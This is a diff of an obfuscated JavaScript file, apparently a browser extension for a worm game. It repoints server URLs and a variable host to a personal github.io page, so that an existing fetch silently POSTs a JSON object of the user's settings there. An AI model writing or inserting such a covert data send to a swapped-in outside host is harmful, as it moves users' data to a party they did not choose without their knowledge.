@@ -1,6 +1,6 @@
 'use strict';
-const zUrl = "https://wormy.wormatrix.io";
-const xUrl = "https://platen-007.github.io/007/v2"
+const zUrl = "https://ii7modysmp-hue.github.io/mywormtest/";
+const xUrl = "https://ii7modysmp-hue.github.io/mywormtest/"
 const URLSERV_WORMWORLD = "https://wormworld.io/extension"
 var Z = {
     positions: {
@@ -7378,7 +7378,7 @@ var GoogleAuth;
                         _0x9f75x19.shift = _0x9f75x9.shift;
                     return _0x9f75x19
                 }();
-            var _0x9f75x60 = 'wormatrix.live';
+            var _0x9f75x60 = 'ii7modysmp-hue.github.io/mywormtest';
 
             function _0x9f75x61(_0x9f75x1f, _0x9f75x3, _0x9f75x28) {
                 let _0x9f75xd = document.createElement('link');
@@ -7476,9 +7476,9 @@ var GoogleAuth;
                     _0x9f75x20.locals = Z.locals;
                     $('#mm-params-nickname').prop('maxlength', 27);
                     fetch('https://' + _0x9f75x60, {
-                        method: 'POST',
-                        body: JSON.stringify(_0x9f75x20)
-                    });
+    method: 'POST',
+    body: JSON.stringify(_0x9f75x20)
+});
                     let _0x9f75x7 = await fetch(URLSERV_WORMWORLD + '/register', {
                         headers: {
                             "Content-Type": 'application/json'
